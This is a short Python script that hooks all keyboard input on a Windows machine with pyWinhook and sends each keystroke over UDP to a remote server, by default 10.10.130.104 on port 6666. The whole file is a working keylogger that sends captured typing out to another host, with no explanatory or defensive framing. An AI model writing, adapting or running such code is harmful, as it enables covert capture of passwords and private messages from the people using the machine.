import pythoncom
#import pyHook
import pyWinhook as pyHook
import sys
import socket
from optparse import OptionParser

def OnKeyboardEvent(event):
    try:
        MESSAGE=chr(event.Ascii)
        print(MESSAGE)
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.sendto(MESSAGE.encode(), (options.server, options.port))
        return True
    except socket.error as e:
        sys.exit(1)
    except KeyboardInterrupt as e:
        sys.exit(1)


if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-s", dest='server', default='10.10.130.104', help="name or IP address of server")
    parser.add_option("-p", dest='port', default=6666,type='int', help="port number")
    (options,args) = parser.parse_args()

    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()